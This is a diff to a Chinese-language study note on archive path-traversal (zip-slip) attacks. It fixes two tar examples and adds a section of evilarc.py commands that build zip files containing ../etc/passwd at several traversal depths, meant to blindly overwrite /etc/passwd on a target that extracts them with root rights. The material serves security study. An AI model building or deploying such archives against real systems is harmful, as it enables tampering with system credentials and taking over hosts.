@@ -116,8 +116,8 @@ cat ././../././1.txt
 
 # 打开1.tar(无则新建) 添加3个文件 testfile 222 111
 python evilarc.py testfile --os=unix --depth=1 --output-file=1.tar --path=admin/manage
-python evilarc.py testfile 222  --os=unix --depth=2 --output-file=1.tar -p admin/Bdir
-python evilarc.py testfile 111  --os=unix --depth=0 --output-file=1.tar
+python evilarc.py 222  --os=unix --depth=2 --output-file=1.tar -p admin/Bdir
+python evilarc.py 111  --os=unix --depth=0 --output-file=1.tar
 ```
 
 
@@ -166,7 +166,20 @@ x 111
 tar: Error exit delayed from previous errors.
 ```
 
-实际文件111是解压成功的，而同一压缩包的其他两个文件因为文件名包含了`..`而解压失败.(tar默认是禁止提取 文件名包含了`..`的文件)
+实际只有文件111是解压成功的，而同一压缩包的其他两个文件因为文件名包含了`..`而解压失败.(tar默认是禁止提取 文件名包含了`..`的文件)
+
+#### 构造压缩文件的过程 - zip文件解压特殊文件名实现目录穿越
+
+覆盖`/etc/passwd`文件 前提 有root权限
+```
+# 将passwd文件放到压缩包中 目录为../etc/passwd
+python evilarc.py passwd --os=unix --depth=1 --path etc --output-file=1.zip
+python evilarc.py passwd --os=unix --depth=2 --path etc --output-file=1.zip
+python evilarc.py passwd --os=unix --depth=3 --path etc --output-file=1.zip
+...
+```
+
+以便于“盲”覆盖目标系统中的`/etc/passwd`文件
 
 
 #### 构造压缩文件的过程 - zip文件解压symlinks文件实现目录穿越
